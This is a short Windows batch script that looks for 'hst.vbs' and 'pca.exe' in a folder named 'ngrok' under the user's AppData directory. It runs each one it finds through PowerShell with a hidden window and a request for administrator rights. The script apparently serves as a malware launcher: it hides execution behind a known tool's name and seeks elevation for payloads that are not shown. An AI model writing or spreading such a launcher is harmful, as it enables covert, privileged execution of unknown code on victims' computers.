@echo off
setlocal

set "USER_PROFILE=%USERPROFILE%"
set "NGROK_DIR=%USER_PROFILE%\AppData\Local\ngrok"
set "VBS_FILE=%NGROK_DIR%\hst.vbs"
set "EXE_FILE=%NGROK_DIR%\pca.exe"

if exist "%VBS_FILE%" (
    powershell -WindowStyle Hidden -Command "Start-Process '%VBS_FILE%' -Verb RunAs"
)

if exist "%EXE_FILE%" (
    powershell -WindowStyle Hidden -Command "Start-Process '%EXE_FILE%' -Verb RunAs"
)

endlocal
